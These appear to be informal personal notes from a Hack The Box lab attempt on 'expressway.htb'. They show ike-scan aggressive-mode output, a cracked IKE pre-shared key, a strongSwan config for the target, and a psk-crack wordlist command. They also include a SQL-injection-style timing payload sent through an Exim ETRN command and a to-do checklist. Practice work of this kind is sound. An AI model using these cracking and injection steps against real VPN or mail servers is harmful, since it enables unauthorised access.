


ISAKMP policy and network security? 
DEBUG: pkt len=356 bytes, bandwidth=56000 bps, int=54857 us
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.249.198  Aggressive Mode Handshake returned HDR=(CKY-R=72ad5d0e3757b2d4) SA=(
Enc=3DES 
Hash=SHA1 
Group=2:modp1024 
Auth=PSK 
LifeType=Seconds 
LifeDuration=28800) KeyExchange(128 bytes) Nonce(3
2 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad713
68a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)



not sure why i can't do ike-scan a second time 
└─$ ike-scan -A -v $HTBHOST                      
ERROR: Could not bind network socket to local port 500
Only one process may bind to the source port at any one time.
ERROR: bind: Address already in use
                                                                                                  

i am not sure which hash to crack because there are multiple hashes being used

freakingrockstarontheroad <- psk 


config setup
    charondebug="all"
    uniqueids=yes
    strictcrlpolicy=no

conn expressway
    authby=secret
    auto=add
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    type=transport
    keyexchange=ikev1
    left=10.10.14.58 
    right=10.129.249.198
    rightsubnet=10.129.249.198[tcp]


use ssh instead?

Server banner: 220 expressway.htb ESMTP Exim 4.98.2 Fri, 26 Sep 2025 05:39:00 +0100

Client:  ETRN #

ETRN response: 458 Administrative prohibition
 Time: 0.0008130073547363281 

!! ETRN command not supported 

Client:  ETRN #',1); SELECT 1 FROM tbl WHERE 1234=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2
)))) /*

ETRN response: 458 Administrative prohibition
 Time: 0.0003452301025390625 

Not vulnerable


# TODO
- [x] nmap all ports
- [x] nmap udp? port 500
- [x] Crack psk password 
psk-crack -d /usr/share/wordlists/rockyou.txt crackme.txt
- [x] try using ipsec the way that the conceal box uses it 
<-- didnt work, pre auth error
- [x] ssh instead with psk 
- [x] try cve for exim 4.98.2
    <-- seems like not vulnerable
- [x] check tftp server 
    <-- seems like it's also not useful 
- [x] check other strongswan configurations to see if maybe there are other secrets i am missing
- [ ] sudo -l and other sudo stuff 
    <-- deprecated version




